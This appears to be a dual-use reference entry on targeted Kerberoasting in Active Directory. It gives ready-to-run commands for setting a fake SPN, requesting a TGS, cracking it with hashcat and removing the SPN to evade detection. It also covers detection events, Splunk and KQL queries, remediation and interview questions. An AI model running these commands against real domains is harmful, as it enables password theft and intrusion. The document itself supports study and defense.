name: Targeted Kerberoasting (Set SPN, Roast, Cleanup)
description: With GenericWrite / GenericAll over a user that has no SPN, temporarily set a fake servicePrincipalName, request a TGS for it (Kerberoast), crack the RC4 hash offline, then remove the SPN. Turns a write ACL over a user into that user's cleartext password.
notes:
=== THE IDEA ===
Kerberoasting normally needs the target to already have an SPN. If you have
GenericWrite/GenericAll over a user WITHOUT an SPN, you can add one yourself, roast,
then delete it - hence 'targeted'.

=== AUTOMATED (targetedKerberoast.py does all of it) ===
  targetedKerberoast.py -d <domain> -u <user> -p <password> --request-user <target_account>
  # sets a temp SPN, requests the TGS, prints the $krb5tgs$ hash, removes the SPN.

=== MANUAL ===
  1. Set SPN:   bloodyAD --host <dc_ip> -d <domain> -u <user> -p <password> set object <target_account> servicePrincipalName -v 'fake/svc'
  2. Roast:     GetUserSPNs.py <domain>/<user>:<password> -dc-ip <dc_ip> -request-user <target_account> -outputfile tgs.txt
  3. Crack:     hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
  4. Cleanup:   bloodyAD ... set object <target_account> servicePrincipalName -v   # (clear it)

=== CLEANUP MATTERS ===
Leaving a bogus SPN behind is an obvious IOC. Always remove it.

recommended.note: GenericWrite/GenericAll over the user is the prerequisite edge.
If the hash will not crack, Shadow Credentials takes the account outright.

defense.why_it_works: The attacker's write access lets them add a servicePrincipalName to the target, which makes the account Kerberoastable; the DC then issues an RC4 TGS encrypted with the target's password hash, crackable offline. The SPN is removed afterward.
defense.prerequisites: GenericWrite/GenericAll (or WriteProperty servicePrincipalName) over a user account, and an offline cracking rig.
defense.impact: Recovery of the target user's cleartext password (if crackable).
defense.detection: [MITRE T1558.003] Event 5136 adding/removing servicePrincipalName on a user (an add quickly followed by a remove is a strong signal); Event 4769 (TGS request) with RC4 (0x17) encryption for that account shortly after the SPN is set.
defense.artifacts: 5136 SPN add/remove pair on a user object; 4769 RC4 TGS request; the extracted $krb5tgs$ hash.
defense.splunk_spl:
index=wineventlog sourcetype="WinEventLog:Security" EventCode=5136 AttributeLDAPDisplayName="servicePrincipalName"
| table _time, SubjectUserName, ObjectDN, OperationType, AttributeValue

index=wineventlog sourcetype="WinEventLog:Security" EventCode=4769 Ticket_Encryption_Type=0x17
| table _time, Account_Name, Service_Name, Client_Address
defense.sentinel_kql:
SecurityEvent
| where EventID == 5136 and AttributeLDAPDisplayName == "servicePrincipalName"
| project TimeGenerated, Actor=SubjectUserName, Target=ObjectDN, Op=OperationType
| join kind=leftouter (
    SecurityEvent | where EventID == 4769 and TicketEncryptionType == "0x17"
    | project RoastTime=TimeGenerated, ServiceName, IpAddress
) on $left.Target == $right.ServiceName
| sort by TimeGenerated desc
defense.prevention: Minimize GenericWrite/GenericAll over users; alert on servicePrincipalName modifications (5136), especially add-then-remove; use AES-only accounts and long (25+ char) passwords for any SPN-bearing account; monitor 4769 RC4 requests.
defense.evasion: Remove the SPN immediately after roasting; request a single TGS to limit 4769 noise.
defense.misconfiguration: Non-administrative principals hold write access to user objects' servicePrincipalName attribute (via GenericWrite/GenericAll or explicit WriteProperty).
defense.secure_config:
# Remove the excessive write ACE (example with dsacls):
dsacls "CN=<target_account>,OU=Users,DC=<domain>" /R "<domain>\<over_privileged_principal>"
# Alert on Event 5136 servicePrincipalName changes on user objects.

interview.q: How does targeted Kerberoasting differ from regular Kerberoasting?
interview.a: Regular Kerberoasting roasts accounts that already have an SPN. Targeted Kerberoasting uses GenericWrite/GenericAll over a user with no SPN: you add a temporary SPN, request the TGS, crack it offline, then remove the SPN - turning a write ACL into the user's password.

interview.q: What is the highest-signal detection for it?
interview.a: Event 5136 adding a servicePrincipalName to a user account quickly followed by removing it, correlated with a 4769 RC4 TGS request for that account. The transient SPN add/remove around a roast is a strong, low-false-positive indicator.

explain:
Turns a write right over an SPN-less user into that user's cleartext password:
  -d <domain>              the domain
  -u <user> -p <password>  authenticate as the account with GenericWrite/GenericAll over the target
  --request-user <target_account>   temporarily set a fake SPN on this user, request its TGS, then remove the SPN
You get a $krb5tgs$ RC4 hash for <target_account>; crack it offline (hashcat -m 13100) to recover the password.
